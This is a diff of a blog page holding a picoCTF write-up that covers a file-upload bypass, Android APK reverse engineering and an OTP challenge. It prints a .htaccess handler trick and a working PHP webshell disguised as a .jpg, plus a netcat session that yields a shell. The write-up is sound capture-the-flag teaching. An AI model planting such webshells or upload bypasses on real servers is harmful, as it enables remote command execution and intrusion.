-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/CrackThePower&gt; nc                  \
    |   saffron-estate.picoctf.net 63308
    | username at 0x3274d2a0
@@ -821,43 +850,43 @@
    | exit
    | Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/sh.      \
    |   Your shell is /bin/sh.
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Yayy!
-
-
-                                    *   *   *
+<span class="r g1" style="--i:3">   Yayy!</span>
 
 
-   <b>## byp4ss3d</b>
-   -----------
+<span class="sep g2">                                    *   *   *</span>
 
-   A university's online registration portal asks students to upload their
+
+<span class="r g2" style="--i:3">   <b>## byp4ss3d</b></span>
+<span class="rl">   -----------</span>
+
+<span class="r g1" style="--i:3">   A university's online registration portal asks students to upload their
    ID cards for verification. The developer put some filters in place to
    ensure only image files are uploaded but are they enough? Take a look at
    how the upload is implemented. Maybe there's a way to slip past the
    checks and interact with the server in ways you shouldn't. You can
-   access the web application at here!
+   access the web application at here!</span>
 
-   <a href="/media/a5d16c6e796c70f23e361318.png"><img src="/media/a5d16c6e796c70f23e361318.png" width="560" height="313" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/a5d16c6e796c70f23e361318.png"><img src="/media/a5d16c6e796c70f23e361318.png" width="560" height="313" alt=""></a></span>
 
-   Uhhhh. I'm really lost for this one, so lets check out the hints!
+<span class="r g1" style="--i:3">   Uhhhh. I'm really lost for this one, so lets check out the hints!</span>
 
-   > Apache can be tricked into executing non-PHP files as PHP with a
-   > `.htaccess` file.
+<span class="r g1" style="--i:3;--h:2">   > Apache can be tricked into executing non-PHP files as PHP with a
+   <span class="qm">> </span>`.htaccess` file.</span>
 
-   We need to create a .htaccess file that tells Apache to execute non-PHP
-   files.
+<span class="r g1" style="--i:3">   We need to create a .htaccess file that tells Apache to execute non-PHP
+   files.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | AddHandler application/x-httpd-php .jpg
    | AddType application/x-httpd-php .jpg
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Then, we can copy over a simple PHP webshell, naming it
-   `webshell.php.jpg`
+<span class="r g1" style="--i:3">   Then, we can copy over a simple PHP webshell, naming it
+   `webshell.php.jpg`</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | &lt;html&gt;
    | &lt;body&gt;
    | &lt;form method="GET" name="&lt;?php echo basename($_SERVER['PHP_SELF']);  \
@@ -875,28 +904,28 @@
    | &lt;/pre&gt;
    | &lt;/body&gt;
    | &lt;/html&gt;⏎
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Then, we upload both files and navigate to the disguised webshell.
+<span class="r g1" style="--i:3">   Then, we upload both files and navigate to the disguised webshell.</span>
 
-   <a href="/media/d46cd6649bdfc7b477292c9e.png"><img src="/media/d46cd6649bdfc7b477292c9e.png" width="560" height="264" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/d46cd6649bdfc7b477292c9e.png"><img src="/media/d46cd6649bdfc7b477292c9e.png" width="560" height="264" alt=""></a></span>
 
-   We are presented with the webshell!!
+<span class="r g1" style="--i:3">   We are presented with the webshell!!</span>
 
-   Poking around, we see `flag.txt` located two directories above, and
+<span class="r g1" style="--i:3">   Poking around, we see `flag.txt` located two directories above, and
    since we can only execute one command at a time with no retention, we
-   can `cat` the flag with `cd ../.. &amp;&amp; cat flag.txt`
+   can `cat` the flag with `cd ../.. &amp;&amp; cat flag.txt`</span>
 
-   <a href="/media/276c12b04f9cb6b61d58e4fb.png"><img src="/media/276c12b04f9cb6b61d58e4fb.png" width="560" height="137" alt=""></a>
-
-
-                                    *   *   *
+<span class="im g1" style="--i:3">   <a href="/media/276c12b04f9cb6b61d58e4fb.png"><img src="/media/276c12b04f9cb6b61d58e4fb.png" width="560" height="137" alt=""></a></span>
 
 
-   <b>## M1n10n'5_53cr37</b>
-   ------------------
+<span class="sep g2">                                    *   *   *</span>
 
-   Get ready for a mischievous adventure with your favorite Minions! 🕵️‍♂️💥
+
+<span class="r g2" style="--i:3">   <b>## M1n10n'5_53cr37</b></span>
+<span class="rl">   ------------------</span>
+
+<span class="r g1" style="--i:3">   Get ready for a mischievous adventure with your favorite Minions! 🕵️‍♂️💥
    They’ve been up to their old tricks, and this time, they've hidden the
    flag in a devious way within the Android source code. Your task is to
    channel your inner Minion and dive into the disassembled or decompiled
@@ -906,13 +935,13 @@
    glass, and get cracking. The Minions have left clues, and it's up to you
    to follow their trail and uncover the flag. Can you outwit these playful
    pranksters and find their secret? Let the Minion mischief begin!Find the
-   android apk here Minions Mobile Application and try to get the flag.
+   android apk here Minions Mobile Application and try to get the flag.</span>
 
-   Oooh, an APK! Scary.
+<span class="r g1" style="--i:3">   Oooh, an APK! Scary.</span>
 
-   Looking around, we can use <a href="https://github.com/iBotPeaches/Apktool">apktool</a> to disassemble the apk.
+<span class="r g1" style="--i:3">   Looking around, we can use <a href="https://github.com/iBotPeaches/Apktool">apktool</a> to disassemble the apk.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/M1n10n'5_53cr37&gt; java -jar         \
    |   apktool_2.12.1.jar d -m minions.apk -o minions_out/
    | I: Using Apktool 2.12.1 on minions.apk with 8 threads
@@ -927,9 +956,9 @@
    | I: Decoding AndroidManifest.xml with resources...
    | I: Copying original files...
    | I: Copying unknown files...
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/M/minions_out&gt; grep "pico" -R
    | smali_classes2/com/example/picoctfimage/R.smali:.class public final  \
    |   Lcom/example/picoctfimage/R;
@@ -1035,27 +1064,27 @@
    |   -&gt;getResources()Landroid/content/res/Resources;
    | smali_classes3/com/example/picoctfimage/MainActivity.smali:    sget  \
    |   v3, Lcom/example/picoctfimage/R$color;-&gt;yellow:I
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Greping for `pico` seems to show a high concentration of occurrences in
+<span class="r g1" style="--i:3">   Greping for `pico` seems to show a high concentration of occurrences in
    `smali_classes3/com/example/picoctfimage/MainActivity.smali` and
    `smali_classes2/com/example/picoctfimage`. I have no idea what those
    directories are though. Further, the app seems to be named
-   `picoctfimage`, so maybe the flag is an image?
+   `picoctfimage`, so maybe the flag is an image?</span>
 
-   And we have a hit!
+<span class="r g1" style="--i:3">   And we have a hit!</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/M/minions_out&gt; find . -type f      \
    |   -name "*.jpg"
    | ./res/drawable/minion.jpg
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   <a href="/media/047b33024795d2f04a3b43cc.jpg"><img src="/media/047b33024795d2f04a3b43cc.jpg" width="560" height="498" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/047b33024795d2f04a3b43cc.jpg"><img src="/media/047b33024795d2f04a3b43cc.jpg" width="560" height="498" alt=""></a></span>
 
-   Running `exiftool`, we get nothing
+<span class="r g1" style="--i:3">   Running `exiftool`, we get nothing</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/M/minions_out&gt; exiftool            \
    |   res/drawable/minion.jpg
    | ExifTool Version Number         : 13.36
@@ -1081,12 +1110,12 @@
    | Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)
    | Image Size                      : 800x711
    | Megapixels                      : 0.569
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Maybe its a red herring, lets look in the aforediscovered
-   `MainActivity.smali`
+<span class="r g1" style="--i:3">   Maybe its a red herring, lets look in the aforediscovered
+   `MainActivity.smali`</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | .class public Lcom/example/picoctfimage/MainActivity;
    | .super Landroidx/appcompat/app/AppCompatActivity;
    | .source "MainActivity.java"
@@ -1213,40 +1242,40 @@
    |     return-void
    | .end method
    |
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Theres nothing immediately obvious from `MainActivity.smali`.
+<span class="r g1" style="--i:3">   Theres nothing immediately obvious from `MainActivity.smali`.</span>
 
-   Hmm....
+<span class="r g1" style="--i:3">   Hmm....</span>
 
-   Searching google for "android apk source file folder", we get some
-   information:
+<span class="r g1" style="--i:3">   Searching google for "android apk source file folder", we get some
+   information:</span>
 
-   For an individual Android app project
+<span class="r g1" style="--i:3">   For an individual Android app project</span>
 
-   - <b>`java` or `kotlin`:</b> This folder contains your application's source
-     code, organized by package name.
-   - <b>`res`:</b> This folder holds all non-code resources, such as images,
-     layouts, and strings.
-   - <b>`manifests`:</b> This folder contains the `AndroidManifest.xml` file,
-     which describes essential information about your app.
+<span class="r g1" style="--i:3;--h:2">   - <b>`java` or `kotlin`:</b> This folder contains your application's source
+     code, organized by package name.</span>
+<span class="r" style="--i:3;--h:2">   - <b>`res`:</b> This folder holds all non-code resources, such as images,
+     layouts, and strings.</span>
+<span class="r" style="--i:3;--h:2">   - <b>`manifests`:</b> This folder contains the `AndroidManifest.xml` file,
+     which describes essential information about your app.</span>
 
-   Lets look through `res` first, as java/kotlin does not exist. There are
+<span class="r g1" style="--i:3">   Lets look through `res` first, as java/kotlin does not exist. There are
    some images in `drawable` folders and then what appears to be
    localizations for various languages, lets check out `values/`,
    presumably `english-US` as others are denoted such as `english-CA` for
-   Canada, and `english-AUR` for Australia.
+   Canada, and `english-AUR` for Australia.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/M/m/r/values&gt; ls
    | attrs.xml  bools.xml  colors.xml  dimens.xml  drawables.xml          \
    |   ids.xml  integers.xml  plurals.xml  public.xml  strings.xml        \
    |   styles.xml
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   `strings.xml` is the most interesting, lets check it out:
+<span class="r g1" style="--i:3">   `strings.xml` is the most interesting, lets check it out:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | &lt;?xml version="1.0" encoding="utf-8"?&gt;
    |
    | &lt;resources&gt;
@@ -1281,38 +1310,38 @@
    | &lt;string name="abc_menu_enter_shortcut_label"&gt;enter&lt;/string&gt;
    |
    | ...
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   YAYY! We get a `Bannana` string of value
+<span class="r g1" style="--i:3">   YAYY! We get a `Bannana` string of value
    `OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCGFWDGX3
-   DGBSDG7I`. That seems to be b64 encoded.
+   DGBSDG7I`. That seems to be b64 encoded.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/M/m/r/values&gt; echo                 \
    |   "OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCG \
    |   FWDGX3DGBSDG7I" | base64 --decode
    | 8)��/����1�t��pQ5����U}�⏎
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Nope...maybe b32?
+<span class="r g1" style="--i:3">   Nope...maybe b32?</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/M/m/r/values&gt; echo                 \
    |   "OBUWG32DKRDHWMLUL53TI43OG5PWQNDSMRPXK3TSGR3DG3BRNY4V65DIGNPW2MDCG \
    |   FWDGX3DGBSDG7I" | base32 --decode
    | picoCTF{1t_w4sn7_h4rd_unr4v3l1n9_th3_m0b1l3_c0d3}
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Nice! That was complicated...
-
-
-                                    *   *   *
+<span class="r g1" style="--i:3">   Nice! That was complicated...</span>
 
 
-   <b>## Pico Bank</b>
-   ------------
+<span class="sep g2">                                    *   *   *</span>
 
-   In a bustling city where innovation meets finance, Pico Bank has emerged
+
+<span class="r g2" style="--i:3">   <b>## Pico Bank</b></span>
+<span class="rl">   ------------</span>
+
+<span class="r g1" style="--i:3">   In a bustling city where innovation meets finance, Pico Bank has emerged
    as a beacon of cutting-edge security. Promising state-of-the-art
    protection for your assets, the bank claims its mobile application is
    impervious to all forms of cyber threats. Pico Bank’s tagline, "Security
@@ -1329,27 +1358,27 @@
    Color: Blue. To perform this challenge, you can use any Android
    emulator. Some examples include Genymotion Android Emulator or Android
    Studio. Access the Pico Bank Website Pico Bank Website and download the
-   application.
+   application.</span>
 
-   With only 120 solves and <b>FIVE</b> hints, this problem scares me.
+<span class="r g1" style="--i:3">   With only 120 solves and <b>FIVE</b> hints, this problem scares me.</span>
 
-   We start by installing <a href="https://developer.android.com/studio/install#linux">Android Studio</a> and running the app inside the
-   emulator.
+<span class="r g1" style="--i:3">   We start by installing <a href="https://developer.android.com/studio/install#linux">Android Studio</a> and running the app inside the
+   emulator.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | zimengx@endeavour ~/S/p/C/PicoBank&gt; ./android-studio/bin/studio.sh
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   <a href="/media/8fe620e61e1247800b3e45af.png"><img src="/media/8fe620e61e1247800b3e45af.png" width="560" height="883" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/8fe620e61e1247800b3e45af.png"><img src="/media/8fe620e61e1247800b3e45af.png" width="560" height="883" alt=""></a></span>
 
-   I didn't expect Android AOSP to be this barebones!
+<span class="r g1" style="--i:3">   I didn't expect Android AOSP to be this barebones!</span>
 
-   <a href="/media/d535c2ed475e7c87cb88bc73.png"><img src="/media/d535c2ed475e7c87cb88bc73.png" width="452" height="973" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/d535c2ed475e7c87cb88bc73.png"><img src="/media/d535c2ed475e7c87cb88bc73.png" width="452" height="973" alt=""></a></span>
 
-   We need to login with a username and password. Let's decompile the apk
-   again with apktool.
+<span class="r g1" style="--i:3">   We need to login with a username and password. Let's decompile the apk
+   again with apktool.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/PicoBank [0|1]&gt; java -jar          \
    |   apktool_2.12.1.jar d pico-bank.apk -o pico-bank-out
    | I: Using Apktool 2.12.1 on pico-bank.apk with 8 threads
@@ -1364,57 +1393,57 @@
    | I: Decoding AndroidManifest.xml with resources...
    | I: Copying original files...
    | I: Copying unknown files...
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   To find the username, we can try the given information that it might be
-   `johnson`.
+<span class="r g1" style="--i:3">   To find the username, we can try the given information that it might be
+   `johnson`.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out [0|SIGINT]&gt; grep   \
    |   "johnson" -R .
    | ./smali_classes3/com/example/picobank/Login$1.smali:                 \
    |   const-string v2, "johnson"
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   If the username is in this file, conveniently named `Login.smali`, the
-   password may be too.
+<span class="r g1" style="--i:3">   If the username is in this file, conveniently named `Login.smali`, the
+   password may be too.</span>
 
-   Grepping for `const-string v2`:
+<span class="r g1" style="--i:3">   Grepping for `const-string v2`:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out [0|SIGINT]&gt; grep   \
    |   "const-string v2" smali_classes3/com/example/picobank/Login\$1.smali
    |     const-string v2, "johnson"
    |     const-string v2, "tricky1990"
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Looks like the password may be `tricky1990`!
+<span class="r g1" style="--i:3">   Looks like the password may be `tricky1990`!</span>
 
-   <a href="/media/550480b80f713cfa63108ce3.png"><img src="/media/550480b80f713cfa63108ce3.png" width="486" height="1008" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/550480b80f713cfa63108ce3.png"><img src="/media/550480b80f713cfa63108ce3.png" width="486" height="1008" alt=""></a></span>
 
-   What?? OTP?!
+<span class="r g1" style="--i:3">   What?? OTP?!</span>
 
-   The OTP might also be hardcoded into the application, or it could be hit
-   by an API endpoint. Lets try the former first.
+<span class="r g1" style="--i:3">   The OTP might also be hardcoded into the application, or it could be hit
+   by an API endpoint. Lets try the former first.</span>
 
-   In the same folder as `Login$1.smali`, we have `OTP.smali`,
+<span class="r g1" style="--i:3">   In the same folder as `Login$1.smali`, we have `OTP.smali`,
    `OTP$1.smali`, and so on. Given the user/pass both used information
    given about `johnson`, the OTP is likely connected to his last
-   transaction amount: `34567`, as it cannot be the text `blue`.
+   transaction amount: `34567`, as it cannot be the text `blue`.</span>
 
-   Grepping for 3456 in these files, we get:
+<span class="r g1" style="--i:3">   Grepping for 3456 in these files, we get:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/P/p/s/c/e/picobank&gt; grep -R "3456" .
    | (.venv) zimengx@endeavour ~/S/p/C/P/p/s/c/e/picobank [0|1]&gt; grep -R  \
    |   "4567" .
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Nope, nothing.
+<span class="r g1" style="--i:3">   Nope, nothing.</span>
 
-   Let's try grepping for `const-string v2` in these files.
+<span class="r g1" style="--i:3">   Let's try grepping for `const-string v2` in these files.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/P/p/s/c/e/picobank [0|1]&gt; grep -R  \
    |   "const-string v2" .
    | ./OTP$2.smali:    const-string v2, "success"
@@ -1424,13 +1453,13 @@
    | ./OTP.smali:    const-string v2, "/verify-otp"
    | ./OTP.smali:    const-string v2, "Invalid OTP"
    | ./OTP.smali:    const-string v2, "otp"
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   We get some things! `OTP.smali` seems to give us a API Endpoint at
+<span class="r g1" style="--i:3">   We get some things! `OTP.smali` seems to give us a API Endpoint at
    `/verify-otp`. `OTP$2.smali` seems to have a success message. Maybe the
-   OTP is in there?
+   OTP is in there?</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    |     invoke-virtual {p1, v2}, Lorg/json/JSONObject;                   \
    |       -&gt;getBoolean(Ljava/lang/String;)Z
    |
@@ -1438,11 +1467,11 @@
    |
    |     .line 91
    |     .local v2, "success":Z
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Not much of use, lets check the `Invalid OTP` string in `OTP.smali`
+<span class="r g1" style="--i:3">   Not much of use, lets check the `Invalid OTP` string in `OTP.smali`</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | .method private verifyOtp(Ljava/lang/String;)V
    |     .locals 10
    |     .param p1, "otp"    # Ljava/lang/String;
@@ -1473,28 +1502,28 @@
    |
    |     move-result-object v1
    |
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Before I scrolled down to that section, we find something more
+<span class="r g1" style="--i:3">   Before I scrolled down to that section, we find something more
    interesting! `const-string v0, "your server url"`. This suggests that
    `/verify-otp` is indeed an endpoint. This also points that `const-string
-   v0` values may also be of use for us.
+   v0` values may also be of use for us.</span>
 
-   But first, the OTP digits:
+<span class="r g1" style="--i:3">   But first, the OTP digits:</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | sget v0, Lcom/example/picobank/R$id;-&gt;otpDigit1:I
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   We have a couple lines of these, where it looks like its either
+<span class="r g1" style="--i:3">   We have a couple lines of these, where it looks like its either</span>
 
-   1. Creating the display boxes for each digit
-   2. or Validating each digit, not quite sure
+<span class="r g1" style="--i:3;--h:3">   1. Creating the display boxes for each digit</span>
+<span class="r" style="--i:3;--h:3">   2. or Validating each digit, not quite sure</span>
 
-   Maybe we're searching in the wrong place?? Lets search everywhere for
-   "OTP".
+<span class="r g1" style="--i:3">   Maybe we're searching in the wrong place?? Lets search everywhere for
+   "OTP".</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out&gt; grep -R "otp"
    | ...
    | res/values/ids.xml:    &lt;item type="id" name="otpDigit4" /&gt;
@@ -1530,19 +1559,19 @@
    | smali_classes3/com/example/picobank/OTP.smali:    sget v0,           \
    |   Lcom/example/picobank/R$layout;-&gt;activity_otp:I
    | ...
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Haha, there we go! `name="otp_value"&gt;9673&lt;/string&gt;`
+<span class="r g1" style="--i:3">   Haha, there we go! `name="otp_value"&gt;9673&lt;/string&gt;`</span>
 
-   <a href="/media/c081251da4e74d6964a2215a.png"><img src="/media/c081251da4e74d6964a2215a.png" width="467" height="962" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/c081251da4e74d6964a2215a.png"><img src="/media/c081251da4e74d6964a2215a.png" width="467" height="962" alt=""></a></span>
 
-   We get a hint: "Have you analyzed the server's responses when handling
-   OTP requests"
+<span class="r g1" style="--i:3">   We get a hint: "Have you analyzed the server's responses when handling
+   OTP requests"</span>
 
-   We know the endpoint is at `/verify-otp`, so lets try sending a POST. We
-   assume the payload is just titled "otp".
+<span class="r g1" style="--i:3">   We know the endpoint is at `/verify-otp`, so lets try sending a POST. We
+   assume the payload is just titled "otp".</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/PicoBank&gt; curl -X POST             \
    |   "http://saffron-estate.picoctf.net:58641/verify-otp" \
    |                                                 -H "User-Agent:      \
@@ -1556,42 +1585,42 @@
    | {"success":true,"message":"OTP verified successfully",               \
    |   "flag":"s3cur3d_m0b1l3_l0g1n_1ff8ddb7}","hint":"The other part of  \
    |   the flag is hidden in the app"}⏎
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Yayy!!!
+<span class="r g1" style="--i:3">   Yayy!!!</span>
 
-   We are told:
+<span class="r g1" style="--i:3">   We are told:</span>
 
-   > The other part of the flag is hidden in the app
+<span class="r g1" style="--i:3;--h:2">   > The other part of the flag is hidden in the app</span>
 
-   <a href="/media/65e367d990c185a1441e023e.png"><img src="/media/65e367d990c185a1441e023e.png" width="478" height="975" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/65e367d990c185a1441e023e.png"><img src="/media/65e367d990c185a1441e023e.png" width="478" height="975" alt=""></a></span>
 
-   Looking at the app, the transactions immediately stand out. They are 7-8
+<span class="r g1" style="--i:3">   Looking at the app, the transactions immediately stand out. They are 7-8
    length sequences of 1s and 0s, The front 1 is likely not needed and a
    red herring as ASCII only makes use of 7 bits (with the first bit
    indicating UTF8 encoding as was later appended to the ASCII standard,
    just happened to read about the ASCII &amp; UTF-8 standard a few days ago
-   :)). If we take these strings and decode it, we might get the flag.
+   :)). If we take these strings and decode it, we might get the flag.</span>
 
-   Since we can't highlight and copy the text, copying it down by hand is
-   too slow. Lets try to see if we can find the values in the code.
+<span class="r g1" style="--i:3">   Since we can't highlight and copy the text, copying it down by hand is
+   too slow. Lets try to see if we can find the values in the code.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/P/pico-bank-out&gt; grep -R "1110000"
    | smali_classes3/com/example/picobank/MainActivity.smali:              \
    |   const-string v7, "$ 1110000"
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   We see that the transactions are likely all in `const-string v7` in
-   `MainActivity.smali`
+<span class="r g1" style="--i:3">   We see that the transactions are likely all in `const-string v7` in
+   `MainActivity.smali`</span>
 
-   Looking at `MainActivity.smali`, we see that the transactions are in a
+<span class="r g1" style="--i:3">   Looking at `MainActivity.smali`, we see that the transactions are in a
    mix of `const-string v6` and `const-string v7`, and some strings are not
    present because they are redundant/repeated again. For sake of time, I
    won't try to understand the variable sachems, but this already makes it
-   dramatically easier for us to copy and paste the codes in sequence.
+   dramatically easier for us to copy and paste the codes in sequence.</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | n = """1110000
    |
    | 1101001
@@ -1657,36 +1686,36 @@
    | i = "0" + i
    |
    | print(chr(int(i,2)), end="")
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   .-----------------------------------------------------------------------
+<span class="vb g1">   .-----------------------------------------------------------------------
    | (.venv) zimengx@endeavour ~/S/p/C/PicoBank&gt; python3 secondPart.py
    | picoCTF{1_l13d_4b0ut_b31ng_⏎
-   '-----------------------------------------------------------------------
+   '-----------------------------------------------------------------------</span>
 
-   Solved!!
+<span class="r g1" style="--i:3">   Solved!!</span>
 
 
-   <b>## Final Rank</b>
-   -------------
+<span class="r g2" style="--i:3">   <b>## Final Rank</b></span>
+<span class="rl">   -------------</span>
 
-   This places me at #115 on the global leader-board and #99 on the
+<span class="r g1" style="--i:3">   This places me at #115 on the global leader-board and #99 on the
    HS/College one. Not sure how its ranked. Likely by time of achieving
    that score rather than time from first problem solve to last problem. I
    will keep an eye out for these going forward so I can solve them as soon
-   as they come out next time. Fun experience overall. 10/10 recommend.
+   as they come out next time. Fun experience overall. 10/10 recommend.</span>
 
-   <a href="/media/a318ce315f80f5a821c0e23f.png"><img src="/media/a318ce315f80f5a821c0e23f.png" width="560" height="37" alt=""></a>
+<span class="im g1" style="--i:3">   <a href="/media/a318ce315f80f5a821c0e23f.png"><img src="/media/a318ce315f80f5a821c0e23f.png" width="560" height="37" alt=""></a></span>
 
-   <a href="/media/a6f029801dd09bae548df120.png"><img src="/media/a6f029801dd09bae548df120.png" width="560" height="36" alt=""></a>
-
-
+<span class="im g1" style="--i:3">   <a href="/media/a6f029801dd09bae548df120.png"><img src="/media/a6f029801dd09bae548df120.png" width="560" height="36" alt=""></a></span>
 
 
-   <img src="/art/d-tilt-m.png" width="184" height="181" alt="">   <a href="/">&lt;- back</a>
 
-   <a href="/blog/picoctf2025-virtual-machine-1/">&lt;- picoCTF2025: Virtual Machine 1</a>
-                               <a href="/blog/patching-raycast-to-support-longer-pastes/">Patching Raycast to Support Longer Pastes -&gt;</a>
+
+<span class="ft g4" style="--w:184">   <img src="/art/d-tilt-m.png" width="184" height="181" alt="">   <a href="/">&lt;- back</a></span>
+
+<span class="r g1" style="--i:3">   <a href="/blog/picoctf2025-virtual-machine-1/">&lt;- picoCTF2025: Virtual Machine 1</a></span>
+<span class="nx">                               <a href="/blog/patching-raycast-to-support-longer-pastes/">Patching Raycast to Support Longer Pastes -&gt;</a></span>
 
 
 
